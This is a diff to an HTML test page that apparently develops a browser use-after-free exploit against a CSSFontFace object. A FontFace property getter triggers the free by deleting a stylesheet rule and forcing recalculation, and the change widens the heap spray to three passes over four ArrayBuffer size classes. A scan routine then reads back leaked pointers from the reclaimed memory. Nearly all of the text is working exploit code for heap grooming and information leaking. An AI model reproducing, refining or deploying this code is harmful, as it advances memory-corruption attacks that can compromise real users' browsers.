@@ -10,11 +10,8 @@
 <h3 id="st">stage A</h3>
 <pre id="out"></pre>
 <script>
-// Phase 2: reclaim + leak (port of 14.10 research FONTFACE_RECLAIM_LEAK design).
-// Inside the getter, after freeing the 192-byte CSSFontFace: spray 104 x
-// 192-byte ArrayBuffers with per-slot markers. The engine's post-free writes
-// (refcount+0x00, m_clients+0x58, m_wrapper+0x68, flag+0x85) land in whichever
-// buffer reclaimed the chunk -> marker oracle + pointer leak on screen.
+// Phase 2 v7: heavy reclaim - 4 size classes x 100 buffers, second-pass spray
+// after the getter returns (microtask + timer), marker oracle per class/slot.
 function log(s) {
   document.getElementById('out').textContent += s + "\n";
 }
@@ -26,48 +23,51 @@ function hex(n, w) {
 
 log('UA = ' + navigator.userAgent);
 
-var NSPRAY = 104, SPRAYLEN = 192;
-var sprays = new Array(NSPRAY);
+var CLASSES = [192, 200, 208, 224];      // size classes around CSSFontFace
+var PER = 100;                            // buffers per class
+var sprays = [];                          // {buf, len, base, cls, slot, pass}
 
-function spray() {
-  for (var i = 0; i < NSPRAY; i++) {
-    var b = new ArrayBuffer(SPRAYLEN);
-    var u = new Uint8Array(b);
-    for (var j = 0; j < SPRAYLEN; j++)
-      u[j] = (i + j) & 0xff;            // per-slot marker pattern
-    sprays[i] = b;
+function sprayPass(pass) {
+  for (var c = 0; c < CLASSES.length; c++) {
+    var len = CLASSES[c];
+    for (var s = 0; s < PER; s++) {
+      var b = new ArrayBuffer(len);
+      var u = new Uint8Array(b);
+      var base = (pass * 61 + c * 83 + s * 7) & 0xff;
+      for (var j = 0; j < len; j++) u[j] = (base + j) & 0xff;
+      sprays.push({ buf: b, len: len, base: base, cls: len, slot: s, pass: pass });
+    }
   }
 }
 
-function scan() {
-  var changes = [];
-  for (var i = 0; i < NSPRAY; i++) {
-    var u = new Uint8Array(sprays[i]);
+function scan(tag) {
+  var hits = [];
+  for (var i = 0; i < sprays.length; i++) {
+    var r = sprays[i];
+    var u = new Uint8Array(r.buf);
     var diff = 0;
-    for (var j = 0; j < SPRAYLEN; j++)
-      if (u[j] !== ((i + j) & 0xff)) diff++;
-    if (diff > 0) changes.push([i, diff]);
+    for (var j = 0; j < r.len; j++)
+      if (u[j] !== ((r.base + j) & 0xff)) diff++;
+    if (diff > 0) hits.push([r, diff]);
   }
-  log('scan: ' + changes.length + ' buffer(s) changed');
-  for (var k = 0; k < changes.length && k < 4; k++) {
-    var i = changes[k][0];
-    log('slot ' + i + ': ' + changes[k][1] + ' bytes differ');
-    var dv = new DataView(sprays[i]);
-    log('  +0x00 u32 : ' + hex(dv.getUint32(0, true), 8) + '  (refcount?)');
-    log('  +0x58 u64 : ' + hex(dv.getBigUint64(0x58, true)) + '  (m_clients/HashTable ptr?)');
-    log('  +0x68 u64 : ' + hex(dv.getBigUint64(0x68, true)) + '  (m_wrapper/WeakPtrImpl ptr?)');
-    log('  +0x85 byte: ' + hex(dv.getUint8(0x85), 2) + '  (status flag?)');
+  log('scan(' + tag + '): ' + hits.length + ' of ' + sprays.length + ' changed');
+  for (var k = 0; k < hits.length && k < 4; k++) {
+    var r = hits[k][0];
+    log('pass' + r.pass + ' len' + r.cls + ' slot' + r.slot + ': ' + hits[k][1] + 'B differ');
+    var dv = new DataView(r.buf);
+    log('  +0x00 u32 : ' + hex(dv.getUint32(0, true), 8));
+    log('  +0x58 u64 : ' + hex(dv.getBigUint64(0x58, true)) + ' (m_clients?)');
+    log('  +0x68 u64 : ' + hex(dv.getBigUint64(0x68, true)) + ' (m_wrapper?)');
+    log('  +0x85 byte: ' + hex(dv.getUint8(0x85), 2));
   }
-  if (changes.length === 0)
-    log('NO reclaim this run - reload the page to retry (per-boot variance)');
-  else
-    log('RECLAIM CONFIRMED - leaked pointers above');
+  if (hits.length) log('RECLAIM CONFIRMED');
+  return hits.length;
 }
 
 function trigger() {
   log('stage B: trigger in 3s');
   setTimeout(function () {
-    log('triggering + spray');
+    log('triggering + heavy spray');
 
     var A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
     document.fonts.add(A);
@@ -79,28 +79,29 @@ function trigger() {
       get: function () {
         fired++;
         if (this === A && fired === 1) {
-          log('GETTER FIRED - freeing + spraying');
+          log('GETTER FIRED - free + spray pass 1');
           try { document.getElementById('s0').sheet.deleteRule(0); } catch (e) {}
           document.body.offsetTop;               // force recalc -> FREE
-          spray();                              // reclaim attempt, 104 x 192B
+          sprayPass(1);                          // 400 buffers, 4 classes
         }
         return undefined;
       }
     });
 
+    // second + third spray passes right after the getter returns
+    if (typeof queueMicrotask === 'function')
+      queueMicrotask(function () { sprayPass(2); });
+    setTimeout(function () { sprayPass(3); }, 0);
+
     try {
       document.fonts.load('1em x', 'AB').then(
-        function (faces) {
-          log('load resolved with ' + (faces ? faces.length : '?') + ' faces');
-          setTimeout(scan, 500);
-        },
-        function (e) { log('load rejected: ' + e); setTimeout(scan, 500); }
+        function (faces) { log('load resolved ' + (faces ? faces.length : '?') + ' faces'); },
+        function (e) { log('load rejected: ' + e); }
       );
     } catch (e) { log('load threw: ' + e); }
 
-    // promise may hang (vulnerable signature) - scan anyway
-    setTimeout(scan, 2000);
-    setTimeout(scan, 5000);
+    setTimeout(function () { if (!scan('2s')) {} }, 2000);
+    setTimeout(function () { scan('6s'); }, 6000);
   }, 3000);
 }
 
